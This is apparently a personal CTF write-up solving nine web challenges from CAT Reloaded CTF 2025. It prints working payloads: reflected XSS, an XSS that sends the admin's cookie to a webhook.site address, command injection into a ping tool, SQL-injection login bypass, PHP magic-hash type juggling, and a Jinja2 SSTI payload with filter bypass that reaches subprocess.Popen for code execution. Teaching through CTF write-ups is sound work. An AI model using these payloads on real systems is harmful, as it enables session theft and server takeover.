---
title: "CAT Reloaded CTF 2025 - Web Challenges"
classes: wide
header:
  teaser: /assets/images/ctfs/CAT_Reloaded_CTF/CAT_Reloaded_Cover.png
ribbon: blue
description: "Hello, This my first CTF writeup (CAT Reloaded CTF). In this writeup I will explain how I get the flag for 9 web challenges. Let's get started.
"
categories:
  - CTFs
toc: false
---

<img src="/assets/images/ctfs/CAT_Reloaded_CTF/CAT_Reloaded_Cover.png" alt="CAT_Reloaded_CTF" style="zoom:100%;" >

Hello, This my first CTF (**CAT Reloaded CTF 2025**). In this writeup I will explain how I get the flag for 6 web challenges.

Let's get started.

## Table of Contents
  - [Scripto](#scripto)
  - [The Phantom Thief](#the-phantom-thief)
  - [DirDigger](#dirdigger)
  - [PipeDream](#pipedream)
  - [adminadminadmin](#adminadminadmin)
  - [اشاااااررررررر](#اشاااااررررررر)
  - [Python Compiler!](#python-compiler)
  - [All are blocked ya m3lm](#all-are-blocked-ya-m3lm)
  - [The Atomic Break-In](#the-atomic-break-in)

## Scripto

![Challenge_1_Desc](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_1_Desc.png)

We can see a website that allows us to write a comment, so let's type random text to see how it works.

![Challenge_1.2](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_1.2.png)

As we see above that the comment is reflected in the web page, so the first thing come to my mind is HTML Injection and XSS (Cross Site Scripting). Let's test for special characters and see how it will be reflected.

![Challenge_1.3](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_1.3.png)

The special characters reflected successfully, let's try to inject HTML code and then XSS and we can see the flag.

XSS payload: `<img src=x onerror=alert(10)>`

HTML Payload: `<h1>Hello World</h1>`

![Challenge_1.4](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_1.4.png)

## The Phantom Thief

![Challenge_2_Desc](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_2_Desc.png)

The challenge provides us with feedback system website which allows us to write a feedback and it will be send to admin.

![Challenge_2.1](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_2.1.png)

So, the first thing came to my mind is to send a malicious feedback to admin to steal cookies or read the flag.

We can use ngrok, burp collaborator or webhook to . I will use webhook site to receive the response when the admin access a malicious feedback.

![Challenge_2.3](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_2.3.png)

XSS Payload: `<img src=x onerror=fetch("https://webhook.site/09c537c2-5f1c-4ae1-b4b5-245abf43a2c0/?cookie="+document.cookie)>`

![Challenge_2.4](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_2.4.png)

![Challenge_2.2](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_2.2.png)

## DirDigger

![Challenge_9_Desc](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_9_Desc.png)

The website have a normal page with `Admin Login` button and the source code doesn't have something interesting.

![Challenge_9.1](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_9.1.png)

Let's move to login page. If we try to login with default credentials, it's not working and source code not useful.

![Challenge_9.2](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_9.2.png)

As the challenge name indicate to directory brute force, we can back to `/admin/` directory.

![Challenge_9.3](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_9.3.png)

After further directory enumeration I can't found something, so let's try to go to `robots.txt`.

Niceee! interesting directories are here.

![Challenge_9.4](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_9.4.png)

Let's try to access them.

![Challenge_9.5](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_9.5.png)

![Challenge_9.6](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_9.6.png)

Unfortunately we can't access them, so we can run `dirsearch`, `gobuster`, `dirb` or any directory brute force tool and we can find `/flag.txt`. Let's try to access it and read the flag.

![Challenge_9.7](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_9.7.png)

## PipeDream

![Challenge_3_Desc](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_3_Desc.png)

The challenge provides us with a ping tool in a website. `ping` allows us to check if ip or host is up or not by sending `icmp` packets.

![Challenge_3](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_3.png)

Let's look at the code also:

![Challenge_3_Code](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_3_Code.png)

We can see above that the IP which is user input is injected into `ping` command without validation and executed in `shell_exec` function (dangerous!).

So, we can run system commands and escape `ping` command using `|` or `;`.

![Challenge_3.2](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_3.2.png)



![Challenge_3.3](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_3.3.png)



![Challenge_3.4](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_3.4.png)

## adminadminadmin

![Challenge_4_Desc](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_4_Desc.png)

The website has a login page and the object is to be an admin, so we can try default credentials such as `admin:admin`, `admin:password`, .etc.

![Challenge_4.1](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_4.1.png)

![Challenge_4.2](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_4.2.png)

Default credentials not working and source code doesn't have something interesting.

We can try to bypass login page using basic `SQL Injection`: `admin' -- -`. 

Now we can suppose the query looks like the following:

`select flag from users where username='admin' -- - & password='test'`

![Challenge_4.4](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_4.4.png)

![Challenge_4.5](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_4.5.png)

## اشاااارااااااككككك

![Challenge_5_Desc](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_5_Desc.png)

The website has an admin login page and we need to login as admin to get the flag. As previous I tried default credentials and `SQL Injection` but not working.

![Challenge_5.1](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_5.1.png)

Let's look at the `src.php` file provided from the challenge description.

We can see that the app checks if the username is admin username and password hash of user is password hash of admin.

![Challenge_5.2](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_5.2.png)

PHP’s `==` operator is prone to type juggling vulnerabilities.

> In PHP, type juggling refers to the automatic and dynamic conversion of data types during operations or comparisons.

if both hashes look like numbers, PHP treats them as numbers.

The MD5 hash of `"QNKCDZO"` is `0e830400451993494058024219903391`, which looks like scientific notation (`0e...` means `0 × 10^...`).

So, we can assume that `$admin_password_hash` happens to be another string that also starts with `0e...` (e.g., `0e123456789...`)  , PHP will interpret both as `0` in scientific notation and consider them **equal**.

![Challenge_5.3](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_5.3.png)

![Challenge_5.4](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_5.4.png)

## Python Compiler!

![Challenge_7_Desc](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_7_Desc.png)

The website provides us with a python code execution which we can write python code and it will be executed such as `print("Hello World")`.

![Challenge_7.1](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_7.1.png)

![Challenge_7.2](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_7.2.png)

So, we need to execute system commands to read `flag.txt` file. We can do this using `os.system()` module.

![Challenge_7.3](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_7.3.png)

![Challenge_7.4](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_7.4.png)



## All are blocked ya m3lm

![Challenge_6_Desc](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_6_Desc.png)

If we take a look at a website, we can see that the website has text box and user input is reflected in in `Result` section.

![Challenge_6.1](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_6.1.png)

So, we can test for malicious input such as XSS, but it's not working here. If you take a closer look at the parameter in URL, you can see that the parameter called `template` which may indicate to SSTI (Server-Side Template Injection) vulnerability.

We can try basic SSTI payload `{{7*7}}` and if the returned result equals `49` or something like this, we can sure that SSTI is there.  

![Challenge_6.2](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_6.2.png)

Now let's look at the source code to have a better understanding on how to complete the attack.

![Challenge_6.3](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_6.3.png)

We can see above that the rendered_result returned without any sanitization and here is how SSTI happens. We  can also see that there are some words in blacklist which we can't use them. 

![Challenge_6.4](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_6.4.png)

After a long search on how to bypass this blacklist, I found [this](https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f) and we can see **attr** is not filtered. So, we can do RCE by replacing underscore with hex `\x5f`  and to bypass `class` keyword we can encode `c` character with hex `\x63`, so we can escape checking but when rendering \x5f will change to underscore.

![Challenge_6.5](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_6.5.png)

![Challenge_6.6](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_6.6.png)

Now let's try to list all subclasses using the same approach.

![Challenge_6.7](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_6.7.png)

As we can see the result returned with all subclasses but to read it effectively, I will decode them from HTML encoding and take them into sublime text. 

![Challenge_6.8](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_6.8.png)

![Challenge_6.9](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_6.9.png)

We can see there are many subclasses, we need `subprocess.Popen` subclass to execute system commands.

> `subprocess.Popen` is a class in Python’s `subprocess` module that allows you to create and manage child processes.
>
> `Popen` starts a new process by running a specified command and allows interaction with its input/output/error streams.

![Challenge_6.10](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_6.10.png)



The original payload: `{{().__class__.__base__.__subclasses__().__getitem__(370)('id',shell=True,stdout=-1).communicate()}}`.

**Payload Analysis:**

1. `()` - Creating an Empty Object

   - `()` creates an empty tuple (`tuple()`).

   - In Jinja2, `{}` and `()` are sometimes used to trick the template engine into evaluating expressions.

2. `().__class__` - Getting the Class of the Tuple

   - `().__class__` returns the class of an empty tuple.

   - In this case, it is `<class 'tuple'>`.

3. `().__class__.__base__` - Accessing the Base Class

   - Every Python class has a `__base__` attribute, which returns its base class.

   - The base class of `tuple` is `object`, so `().__class__.__base__` results in: `object`

4. `object.__subclasses__()` - Getting All Subclasses

   - `object.__subclasses__()` returns a list of all subclasses of the base `object` class.

   - This list contains built-in classes like `int`, `str`, `list`, and importantly, classes related to Python’s internal execution.

5. `().__class__.__base__.__subclasses__().__getitem__(370)`

   - `__getitem__(370)` is equivalent to accessing `object.__subclasses__()[370]`.

   - This retrieves the class located at index `370` in the list of subclasses.

   - The exact class at index `370` varies depending on the Python environment, but in some cases, it points to the `subprocess.Popen` class.

6. `Popen('whoami', shell=True, stdout=-1).communicate()`

   - If index `370` corresponds to `subprocess.Popen`, then:

     `subprocess.Popen('whoami', shell=True, stdout=-1).communicate()`

     executes the `id`command in a subprocess.

   - `shell=True` allows executing commands via the shell.

   - `stdout=-1` redirects standard output (`subprocess.PIPE`).

   - `.communicate()` reads the output of the executed command.

7. `id` Command

   - This command returns the current system user.

   - If executed in a web server environment, it can reveal the user running the web application.

![Challenge_6.11](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_6.11.png)

Now let's continue exploitation and read `flag.txt`

![Challenge_6.12](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_6.12.png)

![Challenge_6.13](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_6.13.png)

## The Atomic Break-In

![Challenge_8_Desc](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_8_Desc.png)

Let's go to website and try to login with default credentials such as `admin:admin`, `test:test`, or `guest:guest` but all of them redirect us to the same website.

![Challenge_8.1](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_8.1.png)

![Challenge_8.2](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_8.2.png)

If we take a look at source code, we can find an interesting comment.

![Challenge_8.3](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_8.3.png)

We can intercept the request to burp repeater and analyze the request cookies.

![Challenge_8.4](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_8.4.png)

![Challenge_8.5](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_8.5.png)

We can see above that the cookie includes role parameter with user role and a hash. Let's check the hash type and change the role to `admin`. 

![Challenge_8.6](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_8.6.png)

So, now we have a `HMAC` info in the comment above and the hash type is `sha2-256`, let's create a hash with the provided information using python.

![Challenge_8.7](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_8.7.png)

Now let's try to update the cookie and get the flag.

![Challenge_8.9](/assets/images/ctfs/CAT_Reloaded_CTF/Challenge_8.9.png)